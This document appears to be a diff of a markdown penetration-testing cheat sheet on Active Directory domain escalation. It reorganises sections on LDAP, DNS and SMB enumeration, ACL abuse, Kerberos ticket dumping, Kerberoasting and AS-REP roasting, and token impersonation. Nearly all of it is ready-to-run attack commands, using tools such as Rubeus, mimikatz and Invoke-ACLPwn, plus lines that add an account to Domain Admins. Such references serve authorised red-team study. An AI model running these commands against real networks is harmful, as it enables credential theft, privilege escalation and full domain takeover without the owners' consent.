@@ -1,42 +1,38 @@
 # Domain escalation
 
-## Tools
+## **Domain enum**
+
+### LDAP enum
 
 - [Bloodhound](https://github.com/BloodHoundAD/BloodHound) & [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
-- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
 - [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
-- [adidnsdump](https://github.com/dirkjanm/adidnsdump)
 - [windapsearch](https://github.com/ropnop/windapsearch)
-- [SharpSniper](https://github.com/HunnicCyber/SharpSniper)
-- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu) (remote graphical view)
-
-> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
+- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
 
 ```bash
-# Install bloodhound
-sudo apt-get update && sudo apt-get install bloodhound python3-pip && git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip3 install .
-```
+# Install full bloodhound
+sudo apt-get update && sudo apt-get install -y bloodhound python3-pip && pip3 install bloodhound
+# bloodhound-python
+bloodhound-python -d <DOMAIN> <user> -p <pass> -dc <FQDN-SERVER> -c All
+# Custom queries
+https://github.com/hausec/Bloodhound-Custom-Queries
 
-```bash
-#enum4linux
-enum4linux -a <target_dc> <user> -p <pass> -d <domain>
+# ldapdomaindump install
+pip install ldapdomaindump
+# ldapdomaindump usage
+ldapdomaindump -u '<domain>\<user>' -p '<pass>' <target>
 
-#bloodhound-python
-bloodhound.py -d <DOMAIN> <user> -p <pass> -dc <FQDN-SERVER> -c all
-
-#ldapdomaindump
-pip install ldapdomaindump && ldapdomaindump -u '<domain>\<user>' -p '<pass>' <target>
+# widapsearch install 
+git clone https://github.com/ropnop/windapsearch.git && pip install python-ldap && cd windapsearch
+# windapsearch usage
+./windapsearch.py -d <domain> -u <user> -p '<pass>' --da -o <output_dir> <target>
+./windapsearch.py -d <domain> -u <user> -p '<pass>' --full -o <output_dir> <target>
 
 #ldapsearch
 sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
 ```
 
----
-
-## **Domain enum**
-
-Get DC IP
+Find DC IP
 
 ```bash
 cat /etc/resolv.conf
@@ -51,19 +47,31 @@ enum4linux -a <target>
 enum4linux <target> |grep "user:" | cut -d '[' -f2 | cut -d "]" -f1 > users.txt
 ```
 
+### DNS enum
+
+
 Domain computers 
 
+- [adidnsdump](https://github.com/dirkjanm/adidnsdump)
+- [SharpSniper](https://github.com/HunnicCyber/SharpSniper)
+
 ```bash
+Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,ipv4Address | Export-CSV ADcomputerslist.csv -NoTypeInformation -Encoding UTF8
+
 #pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
 adidnsdump -u <domain>\\<user> -p <pass>
 adidnsdump -u <domain>\\<user> -p <pass> --forest --include-tombstoned
 adidnsdump -u <domain>\\<user> -p <pass> --dns-tcp
 
-Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,ipv4Address | Export-CSV ADcomputerslist.csv -NoTypeInformation -Encoding UTF8
-
 # Find specific computer of domain user
 SharpSniper.exe emusk <username> <password>
 ```
+
+## GUI enum
+
+- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
+
+> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
 
 ### Open shares \(SMB, NFS, FTP, etc\)
 
@@ -83,14 +91,17 @@ smbmap -H IP --download DOSSIER
 smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
 smbmap --host-file smb-hosts.txt -u '<user>' -p '<pass>' -q -R --depth 3 --exclude ADMIN$ IPC$ -A '(web|server|global|index|login|logout|auth|httpd|config).(xml|config|conf|asax|aspx|php|asp|jsp|html)'
 
+# smbget & smbclient
+smbget -rR smb://<target>/<share>/ -U <user>
+smbclient \\\\<target>\\c$ -U <user>
+smbclient -L //<target> -U '<domain>\<user>'
+
 # SMB V1
 smbclient -L ///192.168.0.1 -U <user> -c ls [--option='client min protocol=NT1']
 mount //10.11.1.136/"Bob Share" /mnt/bob [-o vers=1.0]
 
-smbget -rR smb://<target>/<share>/ -U <user
-smbclient \\\\<target>\\c$ -U <user>
-smbclient -L //<target> -U '<domain>\<user>`
-
+# wireshark filter to find SMB version
+smb.native_lanman
 ```
 
 **SMB writable shares**
@@ -121,8 +132,8 @@ mount <target>:/home/xx /mnt/yy
 
 ### Auto Exploit (ACLPWN)
 
-https://github.com/fox-it/aclpwn.py
-https://github.com/fox-it/Invoke-ACLPwn
+- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
+- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
 
 
 ```bash
@@ -138,7 +149,7 @@ python aclpwn.py -f <username> -ft user -d <domain>--restore aclpwn-20181129-182
 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'
 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile
 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup
-./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <username> -Domain <domain> -Password <password>
 ```
 
 
@@ -175,6 +186,7 @@ nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>
 ## **Impersonation Token**
 
 ### Tools
+
 - [Rubeus.exe](https://github.com/GhostPack/Rubeus) (DOTNET CSHARP)
 - [Tokenvator](https://github.com/0xbadjuju/Tokenvator) (DOTNET CSHARP)
 - [Incognito.exe](https://github.com/FSecureLABS/incognito) (Meterpreter extension)
@@ -191,13 +203,49 @@ $parameters=@("arg1", "arg2")
 [namespace.Class]::Main($parameters)
 ```
 
+### Kerberos Dump 
+
+```bash
+# List SPN
+impacket GetUserSPNs.ps1
+
+# Create new service ticket into memory
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SSQLSvc/xor-app23.xor.com:1433"
+
+# Mimikatz
+.\mimikatz.exe "log" "privilege::debug" "kerberos::list /export" exit
+
+# Rubeus
+Rubeus.exe klist
+Rubeus.exe dump
+```
+
+---
+
+### Kerberos pre-auth
+
+```bash
+Rubeus.exe asreproast /outfile:asrep_hashes.txt
+
+impacket-GetNPUsers -usersfile kerb_users.txt <domain>/<user> -dc-ip <dc_ip>
+```
+
+---
+
+### Kerberoast attack
+
+```bash
+Rubeus.exe kerberoast /outfile:roasted_hashes.txt
+```
+
 ---
 
 ### Kerberos impersonate
 
 Find domain admin accounts 
 
-```bat
+```bash
 net group "Domain Admins" /DOMAIN
 net group "Admins du domaine" /DOMAIN
 ```
@@ -211,18 +259,13 @@ bloodhound.py -d <domain> -u <user> -p <password> -ns <IP-DC> -c LoggedOn
 
 Impersonate kerberos token
 
-```bat
+```bash
 # Rubeus
-Rubeus.exe klist
-Rubeus.exe dump
-Rubeus.exe kerberoast /outfile:roasted_hashes.txt
-Rubeus.exe asreproast /outfile:asrep_hashes.txt
 Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI>
 
 #TokenManipulation
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
-
 
 # Incognito loaded by Meterpreter
 load incognito 
@@ -237,17 +280,17 @@ export KRB5CCNAME=<user>.ccache
 sudo cme smb <target> --kerberos -x whoami
 ```
 
-Create new Domain Admin account 
-
-```bat
-net user add <user> <pass> /domain
-net group "Domain Admins" <user> /add
-```
-
 Check if a computer has the TrustedForDelegation flag enabled
 
-```powershell
+```bash
 Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
+```
+
+Create new Domain Admin account 
+
+```bash
+net user add <user> <pass> /domain
+net group "Domain Admins" <user> /add
 ```
 
 ---
@@ -260,19 +303,3 @@ Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
 
 - [specterops.io](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
 
-
-### Refs
-
-- https://0xsp.com/ad-attack-or-defense/ad-ttps-list
-- https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html
-- https://github.com/yeyintminthuhtut/Awesome-Red-Teaming
-- https://ired.team/
-- https://github.com/vysecurity/RedTips
-- https://0x00-0x00.github.io/
-- https://blog.xpnsec.com/
-- https://egre55.github.io
-- https://rastamouse.me/
-- https://posts.specterops.io/
-- https://dirkjanm.io/
-- https://adsecurity.org/
-- http://www.labofapenetrationtester.com/
